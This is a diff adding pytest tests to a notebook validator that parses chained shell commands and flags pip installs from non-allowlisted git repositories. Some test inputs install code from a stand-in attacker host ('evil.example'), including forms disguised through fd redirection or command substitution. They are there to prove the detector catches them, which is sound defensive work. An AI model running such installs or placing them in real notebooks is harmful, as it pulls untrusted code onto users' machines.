@@ -3681,3 +3681,126 @@ def test_a_branching_parameter_expansion_is_conditional():
         "pip install x",
         "pip install y",
     ]
+
+
+def test_a_pipeline_local_exec_does_not_end_the_line():
+    """`exec` under `|` or `&` runs in a subshell; the parent shell reaches the next command.
+
+    Verified locally that both `exec true | cat; printf ...` and `exec true & printf ...`
+    print their tail. Truncating on every unconditional exec dropped a reachable install.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained("!exec true | cat; pip install a") == [
+        ("!true", False),
+        ("!cat", False),
+        ("!pip install a", False),
+    ]
+    assert nv._split_chained("!exec true & pip install a") == [
+        ("!true", False),
+        ("!pip install a", False),
+    ]
+    # An exec in the main shell still ends the list.
+    assert nv._split_chained("!exec true; pip install a") == [("!true", False)]
+
+
+def test_a_substituted_source_drops_its_shell_delimiters():
+    """`$(printf %s git+https://.../unsloth.git)` hands pip a clean URL.
+
+    The raw scan kept the substitution's closing bracket, so `unsloth.git)` matched no
+    allowlist entry and a permitted install was reported as prohibited.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install $(printf %s git+https://github.com/unslothai/unsloth.git)",
+            "nb.ipynb",
+            0,
+        )
+        == []
+    )
+    assert nv._git_source_repository("git+https://github.com/unslothai/unsloth.git)") == (
+        "github.com/unslothai/unsloth"
+    )
+    # A repository that is not allowlisted is still reported through the same route.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!pip install $(printf %s git+https://evil.example/pkg.git)", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+
+
+def test_a_hyphenated_prerelease_sits_below_the_floor():
+    """PEP 440 spells the same prerelease `2.11.0rc1`, `2.11.0-rc1` and `2.11.0.rc1`.
+
+    `normalise_version` cuts everything from the hyphen, so the hyphenated form reached the
+    check as a plain `2.11.0` and cleared an ABI floor it sits below.
+    """
+    nv = _load_notebook_validator_module()
+
+    for version, floor, expected in (
+        ("2.11.0-rc1", "2.11", False),
+        ("2.11.0-dev1", "2.11", False),
+        ("2.11.0.rc1", "2.11", False),
+        ("2.11.0rc1", "2.11", False),
+        ("2.11.1-rc1", "2.11", True),
+        ("2.11.0", "2.11", True),
+        ("2.11.0+cu128", "2.11", True),
+    ):
+        assert nv.at_least(version, floor) is expected, (version, floor)
+
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
+    assert [
+        f.rule
+        for f in nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torch==2.11.0-rc1" "torchcodec==0.12.0"', colab, "nb.ipynb", 0
+        )
+    ] == ["R-INST-004"]
+
+
+def test_an_always_succeeding_command_keeps_the_chain():
+    """`true` and `:` are documented as always succeeding, so the `&&` after one is reached.
+
+    Treating every non-pip command as a possibly-failing probe dropped the install behind them
+    and R-INST-004 stopped seeing the pair the cell really installs.
+    """
+    nv = _load_notebook_validator_module()
+
+    for filler in ("true", ":"):
+        assert [
+            flag
+            for _, flag in nv._split_chained(
+                f'!pip install "torch==2.11.0" && {filler} && pip install "torchcodec==0.10.0"'
+            )
+        ] == [False, False, False], filler
+    # A command that can fail still ends the assumption.
+    assert [
+        flag for _, flag in nv._split_chained("!pip install a && some_probe && pip install b")
+    ] == [False, False, True]
+
+
+def test_an_input_fd_duplication_is_not_a_separator():
+    """`n<&word` duplicates an INPUT descriptor; only `>&` was exempted.
+
+    Splitting on that `&` reduced `0<&1 pip install ...` to `1 pip install ...`, which reads
+    as no pip at all, so a prohibited VCS install went unreported.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained("!0<&1 pip install git+https://evil.example/x.git") == [
+        ("!pip install git+https://evil.example/x.git", False)
+    ]
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!0<&1 pip install git+https://evil.example/x.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    # A real background operator still separates, and `>&` is still a redirection.
+    assert nv._split_chained("!pip install a & pip install b") == [
+        ("!pip install a", False),
+        ("!pip install b", False),
+    ]
+    assert nv._split_chained("!pip install a >&2") == [("!pip install a >&2", False)]
